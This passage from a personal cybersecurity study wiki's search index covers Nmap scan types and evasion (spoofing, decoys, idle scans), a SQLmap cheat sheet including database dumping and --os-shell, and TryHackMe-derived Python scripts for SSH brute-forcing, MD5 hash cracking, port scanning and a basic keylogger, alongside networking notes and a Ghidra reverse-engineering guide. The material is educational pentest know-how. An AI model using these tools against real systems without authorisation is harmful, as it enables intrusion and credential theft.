set any flag; all six flag bits are set to zero.</p> <p>A TCP packet with no flags set will not trigger any response when it reaches an open port. However, we expect the target server to respond with an RST packet if the port is closed.</p> <p>Because the null scan relies on the lack of a response to infer that the port is not closed, it cannot indicate with certainty that these ports are open; there is a possibility that the ports are not responding due to a firewall rule.</p> <p></p>"},{"location":"Cybersecurity/Scanning/Nmap/#tcp-fin-scan","title":"TCP FIN scan","text":"<p>The FIN scan sends a TCP packet with the FIN flag set. No response will be sent if the TCP port is open. The target system should respond with an RST if the port is closed.</p> <p>Again, Nmap cannot be sure if the port is open or if a firewall is blocking the traffic related to this TCP port. It's worth noting some firewalls will 'silently' drop the traffic without sending an RST.</p> <p></p>"},{"location":"Cybersecurity/Scanning/Nmap/#tcp-xmas-scan","title":"TCP Xmas scan","text":"<p>An Xmas scan sets the <code>FIN, PSH, and URG flags</code> simultaneously.</p> <p>Like the Null scan and FIN scan, if an RST packet is received, it means that the port is closed. Otherwise, it will be reported as open|filtered.</p> <p></p>"},{"location":"Cybersecurity/Scanning/Nmap/#tcp-maimon-scan","title":"TCP Maimon scan","text":"<p>The FIN and ACK bits are set. The target should send an RST packet as a response. However, <code>certain BSD-derived systems drop the packet if it is an open port</code> exposing the open ports.</p> <p>This scan won\u2019t work on most targets encountered in modern networks. Most target systems respond with an RST packet regardless of whether the TCP port is open.</p> <p></p>"},{"location":"Cybersecurity/Scanning/Nmap/#tcp-ack-scan","title":"TCP ACK scan","text":"<p>Not to be confused with the TCP ping ACK scan. An ACK scan will send a TCP packet with the ACK flag set. The target would respond to the ACK with RST regardless of the state of the port.</p> <p>The TCP packet with the ACK flag set should be sent only in response to a received TCP packet to acknowledge the receipt of some data.  Hence, this scan won\u2019t tell us whether the target port is open in a simple setup.</p> <p>Based on which ACK packets resulted in responses, you will learn which ports were not blocked by the firewall. In other words, this type of scan is more <code>suitable to discover firewall rule sets and configuration</code>.</p> <p></p>"},{"location":"Cybersecurity/Scanning/Nmap/#tcp-window-scan","title":"TCP Window scan","text":"<p>Almost the same as the ACK scan; it examines the <code>TCP Window field of the RST packets</code> returned.</p> <p><code>On specific systems, this can reveal that the port is open</code>. We expect to get an RST packet in reply to our \u201cuninvited\u201d ACK packets, regardless of whether the port is open or closed.</p> <p>If we repeat our TCP window scan against a server behind a firewall, we expect to get more satisfying results. The ports that responded differently, indicate that the firewall does not block them.</p>"},{"location":"Cybersecurity/Scanning/Nmap/#spoofing","title":"Spoofing","text":"<p>In some network setups, you will be able to scan a target system using a spoofed IP address and even a spoofed MAC address. This is only beneficial in a situation where you can guarantee to capture the response. If you try to scan a target from some random network using a spoofed IP address, <code>chances are you won\u2019t have any response routed to you</code>, and the scan results could be unreliable.</p> <p></p> <p>In general, you expect to specify the network interface using <code>-e</code> and to explicitly disable ping scan <code>-Pn</code>. Therefore, instead of <code>nmap -S SPOOFED_IP MACHINE_IP</code>, you will need to issue <code>nmap -e NET_INTERFACE -Pn -S SPOOFED_IP MACHINE_IP</code> to tell Nmap explicitly which network interface to use and not to expect to receive a ping reply.</p> <p>When you are on the same subnet as the target machine, you would be able to spoof your MAC address as well. You can specify the source MAC address using <code>--spoof-mac SPOOFED_MAC</code>.</p>"},{"location":"Cybersecurity/Scanning/Nmap/#decoys","title":"Decoys","text":"<p>Spoofing only works in a minimal number of cases where certain conditions are met. Therefore, the attacker might resort to using decoys to make it more challenging to be pinpointed. The concept is simple, <code>make the scan appear to be coming from many IP addresses so that the attacker\u2019s IP address would be lost among them</code>.</p> <p>The scan of the target machine will appear to be coming from 3 different sources, and consequently, the <code>replies will go the decoys as well</code>.</p> <p></p>"},{"location":"Cybersecurity/Scanning/Nmap/#fragmented-packets","title":"Fragmented packets","text":"<p>Nmap provides the option <code>-f</code> to fragment packets. Once chosen, the IP data will be <code>divided into 8 bytes or less</code>. Adding another -f (<code>-f -f</code> or <code>-ff</code>) <code>will split the data into 16 byte-fragments</code> instead of 8. You can change the default value by using <code>--mtu</code>. However, you should always choose a multiple of 8 bytes.</p> <p>In other words, the 24 bytes of the TCP header, in this case, would be divided over two IP fragments, the first containing 16 bytes and the second containing 8 bytes of the TCP header.</p> <p>The data that we will fragment across multiple packets is highlighted in red. To aid in the reassembly on the recipient side, IP uses the identification (ID) and fragment offset, shown on the second row of the figure below.</p> <p>On the other hand, if you prefer to increase the size of your packets to make them look innocuous, you can use the option <code>--data-length NUM</code>, where num specifies the number of bytes you want to append to your packets.</p> <p></p>"},{"location":"Cybersecurity/Scanning/Nmap/#idlezombie-scan","title":"Idle/Zombie Scan","text":"<p>Spoofing will only work in specific network setups. It requires you to be in a position where you can monitor the traffic. Considering these limitations, spoofing your IP address can have little use; however, we can give it an upgrade with the idle scan.</p> <p>The idle scan, or zombie scan, <code>requires an idle system connected to the network that you can communicate with</code>. Nmap will make <code>each probe appear as if coming from the idle (zombie) host</code>, then it will <code>check for indicators whether the idle (zombie) host received any response</code> to the spoofed probe.</p> <p>This is accomplished by checking the IP identification (IP ID) value in the IP header. The idle (zombie) scan requires the following three steps to discover whether a port is open:</p> <ol> <li>Trigger the idle host to respond so that you can record the current IP ID on the idle host.</li> <li>Send a SYN packet to a TCP port on the target. The packet should be spoofed to appear as if it was coming from the idle host (zombie) IP address.</li> <li>Trigger the idle machine again to respond so that you can compare the new IP ID with the one received earlier.</li> </ol> <p></p> <p></p>"},{"location":"Cybersecurity/Scanning/Nmap/#nmap-post-port-scans","title":"Nmap Post port scans","text":""},{"location":"Cybersecurity/Scanning/Nmap/#service-detection","title":"Service detection","text":"<p>Once you discover open ports, you can probe the available port to detect the running service. <code>-sV</code> will force Nmap to proceed with the TCP 3-way handshake and establish the connection in order to discover versions, etc.</p>"},{"location":"Cybersecurity/Scanning/Nmap/#os-detection","title":"OS detection","text":"<p>Nmap can detect the Operating System (OS) based on its behaviour and any telltale signs in its responses.</p>"},{"location":"Cybersecurity/Scanning/Nmap/#traceroute","title":"Traceroute","text":"<p>Traceroute finds the routers between you and the target. Note that Nmap\u2019s traceroute works slightly different than the <code>traceroute</code> command found on Linux and macOS or <code>tracert</code> found on MS Windows.</p> <p>Standard traceroute starts with a packet of low TTL (Time to Live) and keeps increasing until it reaches the target. Remember, TTL refers to the <code>amount of time or \u201chops\u201d that a packet is set to exist</code> inside a network before being discarded by a router.</p>"},{"location":"Cybersecurity/Scanning/Nmap/#nmap-scripting-engine","title":"Nmap scripting engine","text":"<p>Scripts make it possible to add custom functionality that do not exist via the built-in commands. Nmap provides support for scripts using the <code>Lua</code> language. <code>Nmap Scripting Engine (NSE) is a Lua interpreter</code> that allows Nmap to execute Nmap scripts written in Lua language.</p> <p>However, we don\u2019t need to learn Lua to make use of Nmap scripts. Your Nmap default installation can easily contain close to 600 scripts.</p> <p>You can specify to use any or a group of these installed scripts; moreover, you can install other user\u2019s scripts and use them for your scans. Let\u2019s begin with the default scripts. You can choose to run the scripts in the default category using <code>--script=default</code> or simply adding <code>-sC</code>.</p> <p>In addition to default, categories include: - auth - broadcast - brute - default - discovery - dos - exploit - external - fuzzer - intrusive - malware - safe - version - vuln</p>"},{"location":"Cybersecurity/Scanning/Nmap/#saving-the-scan-results","title":"Saving the scan results","text":"<p>Whenever you run a Nmap scan, it is only reasonable to save the results in a file. </p> <p>The three main formats are: 1. Normal format: similar to the output you get on the screen when scanning a target. 2. Grepable format: makes filtering the scan output for specific keywords or terms efficient. 3. XML format: most convenient to process the output in other programs.</p> <p>There is a fourth one that we cannot recommend: Script Kiddie.</p>"},{"location":"Cybersecurity/Scanning/SQLmap/","title":"SQLmap Cheat Sheet","text":"<p>SQLmap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications.</p> Command Description Example Used For <code>sqlmap -u [URL]</code> Basic usage, target a URL for SQL injection detection. <code>sqlmap -u \"http://example.com/vulnerable.php?id=1\"</code> Detecting SQL injection vulnerabilities <code>sqlmap -u [URL] --data=\"[POST data]\"</code> Use POST data for SQL injection testing. <code>sqlmap -u \"http://example.com/login.php\" --data=\"user=admin&amp;pass=1234\"</code> Testing POST parameters <code>sqlmap -u [URL] --cookie=\"[cookie]\"</code> Specify cookie for authentication or session management. <code>sqlmap -u \"http://example.com/dashboard\" --cookie=\"PHPSESSID=abcd1234\"</code> Using cookies for authenticated tests <code>sqlmap -u [URL] --dbs</code> Enumerates databases on the target. <code>sqlmap -u \"http://example.com/vulnerable.php?id=1\" --dbs</code> Database enumeration <code>sqlmap -u [URL] --tables -D [database]</code> Enumerates tables in a specific database. <code>sqlmap -u \"http://example.com/vulnerable.php?id=1\" --tables -D mydb</code> Table enumeration <code>sqlmap -u [URL] --columns -D [database] -T [table]</code> Enumerates columns in a specific table. <code>sqlmap -u \"http://example.com/vulnerable.php?id=1\" --columns -D mydb -T users</code> Column enumeration <code>sqlmap -u [URL] --dump -D [database] -T [table]</code> Dumps data from a specific table. <code>sqlmap -u \"http://example.com/vulnerable.php?id=1\" --dump -D mydb -T users</code> Data extraction <code>sqlmap -u [URL] --technique=[technique]</code> Specify the injection technique (e.g., boolean-based, time-based). <code>sqlmap -u \"http://example.com/vulnerable.php?id=1\" --technique=BEUST</code> Selecting specific attack techniques <code>sqlmap -u [URL] --level=[level]</code> Set the level of tests to be performed (1-5, higher = more tests). <code>sqlmap -u \"http://example.com/vulnerable.php?id=1\" --level=5</code> Adjusting test depth <code>sqlmap -u [URL] --risk=[risk]</code> Set the risk level (1-3, higher = more intrusive tests). <code>sqlmap -u \"http://example.com/vulnerable.php?id=1\" --risk=3</code> Adjusting risk of tests <code>sqlmap -u [URL] --threads=[number]</code> Set the number of threads for parallel execution. <code>sqlmap -u \"http://example.com/vulnerable.php?id=1\" --threads=10</code> Speeding up the attack <code>sqlmap -u [URL] --time-sec=[seconds]</code> Set the delay between requests for time-based injections. <code>sqlmap -u \"http://example.com/vulnerable.php?id=1\" --time-sec=5</code> Fine-tuning time-based injections <code>sqlmap -u [URL] --batch</code> Runs SQLmap automatically, skipping user interaction. <code>sqlmap -u \"http://example.com/vulnerable.php?id=1\" --batch</code> Automatic operation without prompts <code>sqlmap -u [URL] --tor</code> Use Tor network for anonymity while testing. <code>sqlmap -u \"http://example.com/vulnerable.php?id=1\" --tor</code> Anonymizing the attack <code>sqlmap -u [URL] --tamper=[script]</code> Use a tamper script to bypass WAF or other defenses. <code>sqlmap -u \"http://example.com/vulnerable.php?id=1\" --tamper=space2comment</code> Bypassing defenses <code>sqlmap -u [URL] --os-shell</code> Attempt to gain an operating system shell on the target machine. <code>sqlmap -u \"http://example.com/vulnerable.php?id=1\" --os-shell</code> OS-level access after SQL injection"},{"location":"Cybersecurity/Scanning/SQLmap/#common-sqlmap-workflow","title":"Common SQLmap Workflow","text":"<ol> <li>Basic SQL Injection Test <pre><code>sqlmap -u \"http://example.com/vulnerable.php?id=1\"\n</code></pre></li> </ol>"},{"location":"Cybersecurity/Scripting/PythonForPentesters/","title":"Python","text":""},{"location":"Cybersecurity/Scripting/PythonForPentesters/#python-basics","title":"Python basics","text":"<p>Disclaimer: I'm not going to summarize python as there's plenty of resources to learn it. Here's some common takeaways, not in any particular order. All of these examples are straight from the TryHackMe website and script modification will be needed to make them work.</p> <p>Popular libraries / tools you may find useful in scripting as a pentester: - Request - simple HTTP library. - Scapy - send, sniff, dissect and forge network packets - Pwntools - a CTF &amp; exploit development library. - Tool to convert python into windows executable: <code>py2exe</code></p>"},{"location":"Cybersecurity/Scripting/PythonForPentesters/#subdomain-enumeration","title":"Subdomain enumeration","text":"<p>Python gives us an easy way to automate tasks during a penetration test. Any tasks that you have to perform regularly are worth automating. While the automation process comes with a learning curve, the mid and long-term gains are worth it.</p> <p>The script then tries to connect to the subdomains and assumes the ones that accept the connection exist.</p> <pre><code>import requests \nimport sys \n\nsub_list = open(\"subdomains.txt\").read() \nsubdoms = sub_list.splitlines()\n\nfor sub in subdoms:\n    sub_domains = f\"http://{sub}.{sys.argv[1]}\" \n\n    try:\n        requests.get(sub_domains)\n\n    except requests.ConnectionError: \n        pass\n\n    else:\n        print(\"Valid domain: \",sub_domains)   \n</code></pre>"},{"location":"Cybersecurity/Scripting/PythonForPentesters/#directory-enumeration","title":"Directory enumeration","text":"<p>Once subdomains have been discovered, the next step would be to find directories.</p> <pre><code>import requests \nimport sys \n\nsub_list = open(\"wordlist.txt\").read() \ndirectories = sub_list.splitlines()\n\nfor dir in directories:\n    dir_enum = f\"http://{sys.argv[1]}/{dir}.html\" \n    r = requests.get(dir_enum)\n    if r.status_code==404: \n        pass\n    else:\n        print(\"Valid directory:\" ,dir_enum)\n</code></pre>"},{"location":"Cybersecurity/Scripting/PythonForPentesters/#network-scanner","title":"Network scanner","text":"<p>Python can be used to build a simple ICMP (Internet Control Message Protocol) scanner to identify potential targets on the network. However, ICMP packets can be monitored or blocked as the target organization would not expect a regular user to \u201cping a server\u201d. On the other hand, systems can be configured to not respond to ICMP requests. These are the main reasons why using the ARP (Address Resolution Protocol) to identify targets on the local network is more effective.</p> <pre><code>from scapy.all import *\n\ninterface = \"eth0\"\nip_range = \"10.10.X.X/24\"\nbroadcastMac = \"ff:ff:ff:ff:ff:ff\"\n\npacket = Ether(dst=broadcastMac)/ARP(pdst = ip_range) \n\nans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)\n\nfor send,receive in ans:\n        print (receive.sprintf(r\"%Ether.src% - %ARP.psrc%\"))     \n</code></pre>"},{"location":"Cybersecurity/Scripting/PythonForPentesters/#port-scanner","title":"Port scanner","text":"<pre><code>import sys\nimport socket\nimport pyfiglet\n\nascii_banner = pyfiglet.figlet_format(\"TryHackMe \\n Python 4 Pentesters \\nPort Scanner\")\nprint(ascii_banner)\n\nip = '192.168.1.6' \nopen_ports =[] \n\nports = range(1, 65535)\n\ndef probe_port(ip, port, result = 1): \n  try: \n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n    sock.settimeout(0.5) \n    r = sock.connect_ex((ip, port))   \n    if r == 0: \n      result = r \n    sock.close() \n  except Exception as e: \n    pass \n  return result\n\nfor port in ports: \n    sys.stdout.flush() \n    response = probe_port(ip, port) \n    if response == 0: \n        open_ports.append(port) \n\nif open_ports: \n  print (\"Open Ports are: \") \n  print (sorted(open_ports)) \nelse: \n  print (\"Looks like no ports are open :(\")\n</code></pre>"},{"location":"Cybersecurity/Scripting/PythonForPentesters/#file-downloader","title":"File downloader","text":"<pre><code>import requests\n\nurl = 'https://download.sysinternals.com/files/PSTools.zip'\nr = requests.get(url, allow_redirects=True)\nopen('PSTools.zip', 'wb').write(r.content)  \n</code></pre>"},{"location":"Cybersecurity/Scripting/PythonForPentesters/#hash-cracker","title":"Hash cracker","text":"<pre><code>import hashlib\nimport pyfiglet\n\nascii_banner = pyfiglet.figlet_format(\"TryHackMe \\n Python 4 Pentesters \\n HASH CRACKER for MD 5\")\nprint(ascii_banner)\n\nwordlist_location = str(input('Enter wordlist file location: '))\nhash_input = str(input('Enter hash to be cracked: '))\n\nwith open(wordlist_location, 'r') as file:\n    for line in file.readlines():\n        hash_ob = hashlib.md5(line.strip().encode())\n        hashed_pass = hash_ob.hexdigest()\n        if hashed_pass == hash_input:\n            print('Found cleartext password! ' + line.strip())\n            exit(0)\n</code></pre>"},{"location":"Cybersecurity/Scripting/PythonForPentesters/#keyloggers","title":"Keyloggers","text":"<pre><code>import keyboard\nkeys = keyboard.record(until ='ENTER')\nkeyboard.play(keys)\n</code></pre>"},{"location":"Cybersecurity/Scripting/PythonForPentesters/#ssh-brute-forcing","title":"SSH brute forcing","text":"<pre><code>import paramiko\nimport sys\nimport os\n\ntarget = str(input('Please enter target IP address: '))\nusername = str(input('Please enter username to bruteforce: '))\npassword_file = str(input('Please enter location of the password file: '))\n\ndef ssh_connect(password, code=0):\n    ssh = paramiko.SSHClient()\n    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\n    try:\n        ssh.connect(target, port=22, username=username, password=password)\n    except paramiko.AuthenticationException:\n        code = 1\n    ssh.close()\n    return code\n\nwith open(password_file, 'r') as file:\n    for line in file.readlines():\n        password = line.strip()\n\n        try:\n            response = ssh_connect(password)\n\n            if response == 0:\n                 print('password found: '+ password)\n                 exit(0)\n            elif response == 1: \n                print('no luck')\n        except Exception as e:\n            print(e)\n        pass\n\ninput_file.close()\n</code></pre>"},{"location":"Networks/Cheat_Sheet/","title":"Networking","text":"<p>Networks are simply things connected. For example: \"the internet\" is one big network of connected computer networks.</p>"},{"location":"Networks/Cheat_Sheet/#internet-protocol-addresses-ipv4","title":"Internet Protocol Addresses (IPv4)","text":"<p>Tip</p> <ul> <li>Private IP ranges are reserved for internal networks and not routable on the internet.</li> <li>Public IPs are globally unique and used to communicate over the internet.             </li> <li>Private IP ranges:                                                                   <ul> <li>Class A: 10.0.0.0 \u2013 10.255.255.255 (Large networks).                              </li> <li>Class B: 172.16.0.0 \u2013 172.31.255.255 (Medium networks).                           </li> <li>Class C: 192.168.0.0 \u2013 192.168.255.255 (Small networks).                          </li> </ul> </li> <li>Loopback addresses: 127.0.0.0/8, typically used to test network configurations locally.</li> <li>Link-local addresses: 169.254.0.0/16, used when no DHCP server is available.          </li> <li>Public IPs are assigned by ISPs and must be purchased or leased.                      </li> <li>Use CIDR notation (e.g., /24) to define subnets within IP ranges.                     </li> <li>Avoid using overlapping private IP ranges in different subnets to prevent conflicts.  </li> <li>NAT (Network Address Translation) is used to map private IPs to a single public IP.   </li> <li>IPv6 private IP ranges:                                                              <ul> <li>Unique Local Addresses (ULA): fc00::/7.                                           </li> <li>Link-local IPv6: fe80::/10, automatically assigned for local communication.       </li> </ul> </li> <li>IPv4 public addresses are becoming scarce; IPv6 adoption is growing to address this.  </li> <li>Always assign static IPs to critical infrastructure like servers and printers.        </li> <li>Use a DHCP server to dynamically assign IPs to devices on your network.               </li> <li>Check your external IP address using tools like <code>whatismyip.com</code> or <code>ipconfig</code>/<code>ifconfig</code>.</li> </ul>"},{"location":"Networks/Cheat_Sheet/#common-protocols","title":"Common Protocols","text":"Protocol Layer Purpose HTTP Application Transfers hypertext for websites (web browsing). HTTPS Application Secure version of HTTP, encrypts web traffic (TLS/SSL). FTP Application Transfers files between systems. SFTP Application Secure File Transfer Protocol, encrypts file transfers. SMTP Application Sends emails between mail servers. IMAP Application Accesses and manages email on mail servers. POP3 Application Retrieves emails from servers (download and delete). DNS Application Resolves domain names to IP addresses. DHCP Application Dynamically assigns IP addresses to devices on a network. SNMP Application Monitors and manages network devices. Telnet Application Provides remote access to devices (unsecured). SSH Application Secure remote access and command execution. NTP Application Synchronizes system clocks across devices. TCP Transport Ensures reliable data transmission (connection-oriented). UDP Transport Transmits data quickly without reliability checks (connectionless). IP Network Delivers packets across networks. ICMP Network Sends error messages and network diagnostics (e.g., ping). ARP Network Resolves IP addresses to MAC addresses within a local network. RARP Network Resolves MAC addresses to IP addresses. BGP Network Manages routing between autonomous systems on the internet. OSPF Network Determines best routes within a single autonomous system. Ethernet Data Link Defines wired local area network (LAN) standards. Wi-Fi Data Link Defines wireless local area network (WLAN) standards. PPP Data Link Provides point-to-point connections. VLAN Data Link Segments networks into virtual LANs. MPLS Data Link/Network Directs data efficiently through complex networks."},{"location":"Networks/Cheat_Sheet/#ports-connectivity","title":"Ports &amp; Connectivity","text":"<p>Tip</p> <ul> <li>Ports 0-1023 are \"well-known\" ports and typically require privileged access to use.  </li> <li>Ports 1024-49151 are \"registered\" ports, often used by user applications or services.</li> <li>Ports 49152-65535 are \"dynamic\" or \"ephemeral\" ports, used temporarily for connections.</li> <li>Port 80 is commonly used for HTTP traffic, ensure it\u2019s open for web servers.         </li> <li>Port 443 is for HTTPS traffic, crucial for secure websites and applications.         </li> <li>Avoid exposing sensitive ports (e.g., 22 for SSH, 3389 for RDP) directly to the internet.</li> <li>Use a firewall to restrict unused or unnecessary ports to enhance security.          </li> <li>Check open ports on a device using tools like <code>netstat</code> or <code>nmap</code>.                   </li> <li>Block or close unused ports to reduce attack surfaces.                               </li> <li>Use non-default ports for services when possible to deter automated attacks.         </li> <li>Use port forwarding in NAT to map external requests to internal servers.             </li> <li>Test connectivity to a port using <code>telnet</code> or tools like <code>nc</code> (netcat).              </li> <li>Use port filtering or ACLs to control which devices can access specific ports.       </li> <li>Monitor open ports regularly to detect unauthorized services or changes.             </li> <li>Be aware that some ports (e.g., 53 for DNS) can be exploited for attacks like DDoS.  </li> </ul>"},{"location":"Networks/Devices/","title":"Devices","text":""},{"location":"Networks/Networks/","title":"What is a network?","text":"<ul> <li>2 or more computers sharing resources located on or provided by network nodes</li> <li>Resources are files, videos, etc.</li> <li>Nodes are</li> <li>Sharing is done by following common communication protocols over digital interconnections</li> <li>Interconnections are made up of telecommunication network technologies based on:</li> <li>Physical wires</li> <li>Optical wires</li> <li>Radio frequencies (Wireless)</li> <li>etc.</li> </ul>"},{"location":"Programming/P1/Introduction/","title":"Introduction","text":"<p>This resource is free and open-source, built entirely on publicly available knowledge. For transparency and further reading, you can find our sources on the references page.</p> <p>Its purpose is to provide a structured learning path through the core principles of compiled programming languages, with a focus on both C# (.NET) and C++. While the examples draw from these two languages, many concepts apply broadly across modern compiled languages.</p> <p>The guide follows a progressive, language-agnostic structure. Topics are introduced in a logical order to build a solid foundation before moving into more advanced material. Where useful, side-by-side comparisons are provided to highlight the similarities and differences between C# and C++.</p> <p>Warning</p> <p>This guide emphasizes depth and clarity. While it is beginner-friendly in tone, the structure may introduce complex ideas early on. If a topic feels overwhelming, take your time\u2014pause, research, experiment, and revisit as needed. That\u2019s how lasting understanding is built.</p>"},{"location":"Programming/P1/Introduction/#learning-structure-the-phasing-system","title":"Learning Structure: The Phasing System","text":"<p>To support structured learning, this resource is divided into progressive phases. Each phase builds on the previous one, guiding you from foundational knowledge to high-level programming concepts.</p> <p>| Phase | Title | Focus Area | | Phase I | Foundations | The absolute essential principles of programming. | | Phase II | Core Competencies | Practical syntax, OOP, intermediate logic, and control structures. | | Phase III | Advanced Concepts | Deeper topics like performance, language internals, and system-level code. | | Phase IV | Code Design | Architecture, design patterns, security, and maintainable code design. | | Phase V | Assembly |  Low-Level x86_64 assembly, memory layout, stack frames, calling conventions, etc. |</p> <p>This phased approach supports a long-term understanding of programming, from high-level structure to the underlying mechanics of execution.</p>"},{"location":"Programming/P1/Software/","title":"What is Software","text":"<p>Understand what software is, how it runs, and how Windows manages processes.</p> <p>Example</p> C#C++ main.cs<pre><code>//.NET processes, CLR, Process.Start()\nusing System;\n\nnamespace ConsoleProject\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            Console.WriteLine(\"Hello world!\");\n        }\n    }\n}\n</code></pre> main.cpp<pre><code>// WinMain, main(), CreateProcess, task manager view\n#include &lt;iostream&gt;\n\nint main()\n{\n    std::cout &lt;&lt; \"Hello world!\" &lt;&lt; std::endl;\n    return 0;\n}\n</code></pre>"},{"location":"Reverse_Engineering/Advanced_static/","title":"Advanced Static analysis","text":"<p>In Advanced Static Analysis, we will move further and reverse engineer malware into the disassembled code and <code>analyze the assembly instructions</code> to understand the malware's core functionality in a better way.</p> <p>Advanced static analysis is a technique used to analyze the code and structure of malware without executing it. This can help us identify the malware's behavior and weaknesses and develop signatures for antivirus software to detect it. By analyzing the code and structure of malware, researchers can also better understand how it works and develop new techniques for defending against it.</p>"},{"location":"Reverse_Engineering/Advanced_static/#malware-analysis-overview","title":"Malware analysis overview","text":"Technique Description Basic static analysis Aims to understand the malware's <code>structure</code>. Involves examining the malware's <code>code</code>, <code>file headers</code>, and <code>other static properties</code>. Advanced static analysis Aims to uncover <code>hidden or obfuscated code and functionality</code> within the malware. Involves using more advanced techniques to analyze the malware's code, such as <code>deobfuscation</code> and <code>code emulation</code>. Basic dynamic analysis Aims to observe the malware's <code>behavior during execution</code> in a controlled environment. Involves <code>executing</code> the malware in a sandbox or virtual machine and <code>monitoring</code> its <code>system activity</code>, <code>network traffic</code>, and <code>process behavior</code>. Advanced dynamic analysis Aims to uncover more <code>complex and evasive malware behavior</code> using advanced monitoring techniques. Involves using more sophisticated sandboxes and monitoring tools to <code>capture the malware's behavior in greater detail</code>."},{"location":"Reverse_Engineering/Advanced_static/#how-advanced-static-analysis-is-performed","title":"How advanced static analysis is performed","text":"<p>To perform advanced static analysis, <code>disassemblers</code> such as <code>IDA Pro</code>, <code>Binary Ninja</code>, and <code>radare2</code> are commonly used. These disassemblers allow the analyst to explore the malware's code and <code>identify its functions and data structures</code>.</p> <p>The steps involved in performing advanced static analysis of malware are as follows:</p> <ul> <li>Identify the <code>entry point</code> of the malware and the <code>system calls</code> it makes.</li> <li>Identify the malware's <code>code sections</code> and analyze them using available tools such as <code>debuggers</code> and <code>hex editors</code>.</li> <li>Analyze the malware's <code>control flow</code> graph to identify its <code>execution path</code>.</li> <li>Trace the malware's dynamic behavior by <code>analyzing the system calls</code> it makes during execution.</li> <li>Use the above information to understand the malware's <code>evasion techniques</code> and the <code>potential damage it can cause</code>.</li> </ul>"},{"location":"Reverse_Engineering/Advanced_static/#ghidra","title":"Ghidra","text":"<p>Many <code>disassemblers</code> like Cutter, radare2, Ghidra, and IDA Pro can be used to disassemble malware. However, we will explore Ghidra because it's <code>free</code>, <code>open-source</code>, and has <code>many features</code> that can be utilized to get proficient in reverse engineering.</p> <p>Warning</p> <p>The objective is to get comfortable with the main usage of a disassembler and use that knowledge to use any disassembler.</p> <p><code>Ghidra</code> is a software reverse engineering tool that allows users to analyze compiled code to understand its functionality. It is designed to help analysts and developers understand how the software works by providing a platform to <code>decompile</code>, <code>disassemble</code>, and <code>debug binaries</code>.</p> <p>Ghidra includes many features that make it a powerful reverse engineering tool. Some of these features include:</p> <ul> <li><code>Decompilation</code>: Ghidra can <code>decompile</code> binaries <code>into readable C code</code>, making it easier for developers to understand how the software works.</li> <li><code>Disassembly</code>: Ghidra can <code>disassemble</code> binaries <code>into assembly language</code>, allowing analysts to examine the low-level operations of the code.</li> <li><code>Debugging</code>: Ghidra has a built-in <code>debugger</code> that allows users to <code>step through</code> code and examine its behavior.</li> <li><code>Analysis</code>: Ghidra can <code>automatically identify functions</code>, <code>variables</code>, and <code>other code</code> to help users understand the <code>structure of the code</code>.</li> </ul>"},{"location":"Reverse_Engineering/Advanced_static/#how-to-use-ghidra","title":"How to use Ghidra","text":"<ol> <li>Open Ghidra and create a <code>new project</code>.</li> <li> <p>Select <code>Non-Shared Project</code>.</p> <p>Selecting Shared Project would allow us to share our analysis with other analysts.</p> </li> <li> <p>Name the project and <code>set the directory</code> or leave the default path.</p> </li> <li><code>Import</code> the executable you want to analyze. Now that we have created an empty project, let's Drag &amp; Drop the executable and select the program.</li> <li>Once it's imported, it shows us the summary of the program.</li> <li><code>Double-click on the .exe</code> to open it in the Code Browser. When asked to analyze the executable, <code>click on Yes</code>.</li> <li>The next window that appears shows us various analysis options. We can <code>check or uncheck them based on our needs</code>. These plug-ins or add-ons assist Ghidra during the analysis.</li> <li>It will take some time to analyze. The bar on the bottom-right shows the progress. <code>Wait</code> until the analysis is 100%.</li> </ol>"},{"location":"Reverse_Engineering/Advanced_static/#ghidra-layout","title":"Ghidra layout","text":"<ol> <li> <p><code>Program Trees</code>: Shows (PE) sections of the program. We can click on different sections to see the content within each.</p> </li> <li> <p><code>Symbol Tree</code>:</p> <ul> <li><code>Imports</code>: This section contains information about the <code>libraries being imported</code> by the program. Clicking on each API call shows the assembly code that uses that API.</li> <li><code>Exports</code>: This section contains the API/function calls being exported by the program. This section is <code>useful when analyzing a DLL</code>, as it will show all the functions dll contains.</li> <li><code>Functions</code>: This section contains the functions it finds within the code. Clicking on each function will take us to the disassembled code of that function. It also contains the <code>entry function</code>. Clicking on the entry function will take us to the <code>start of the program</code> we are analyzing. Functions with <code>generic names</code> starting with <code>FUN_VirtualAddress</code> are the ones that <code>Ghidra does not give any names to</code>.</li> </ul> </li> <li> <p><code>Data Type Manager</code>: This section shows various data types found in the program.</p> </li> <li> <p><code>Listing</code>: This window shows the disassembled code of the binary, which includes the following values in order.</p> <ul> <li><code>Virtual Address</code></li> <li><code>Opcode</code></li> <li><code>Assembly Instruction (PUSH, POP, ADD, XOR, etc.)</code></li> <li><code>Operands</code></li> <li><code>Comments</code></li> </ul> </li> <li> <p><code>Decompile</code>: Ghidra translates the assembly code into a <code>pseudo C code</code> here. This is a very important section to look at during analysis as it gives a better understanding of the assembly code.</p> </li> <li> <p><code>Toolbar</code>: It has various <code>options to use</code> during the analysis.</p> </li> <li> <p><code>Graph View</code>: The Graph View in the toolbar is an important option, allowing us to see the graph view of the disassembly:</p> <p></p> </li> <li> <p>The <code>Memory Map</code> option shows the memory mapping of the program as shown below:</p> <p></p> </li> <li> <p>This <code>navigation toolbar</code> shows different options to navigate through the code.</p> <p></p> </li> <li> <p><code>Explore Strings</code>. Go to <code>Search -&gt; For Strings</code> and click Search will give us the strings that Ghidra finds within the program. This window can contain very juicy information to help us during the analysis.</p> <p></p> </li> </ol>"},{"location":"Reverse_Engineering/Advanced_static/#identifying-c-code-constructs-in-assembly","title":"Identifying C code constructs in Assembly","text":"<p>Analyzing the assembly code of the compiled binary can be overwhelming for beginners. Understanding the assembly instructions and how various programming components are translated/reflected into the assembly is important. Here, we will examine various C constructs and their corresponding assembly code. This will help us identify and focus on the key parts of the malware during analysis.</p> <p>Warning</p> <p>Different compilers add their own code for various checks while compiling.</p> <p>Therefore expect some garbage assembly code that does not make sense.</p> <p>There are different approaches to begin analyzing the disassembled code:</p> <ul> <li>Locate the <code>main</code> function from the <code>Symbol Tree</code> section.</li> <li>Check the <code>.text</code> code from the <code>Program Trees</code> section to see the code section and find the entry point.</li> <li>Search for interesting <code>strings</code> and locate the code from where those strings are referenced.</li> </ul>"},{"location":"Reverse_Engineering/Advanced_static/#hello-world-example","title":"Hello World example","text":"<p>C code: 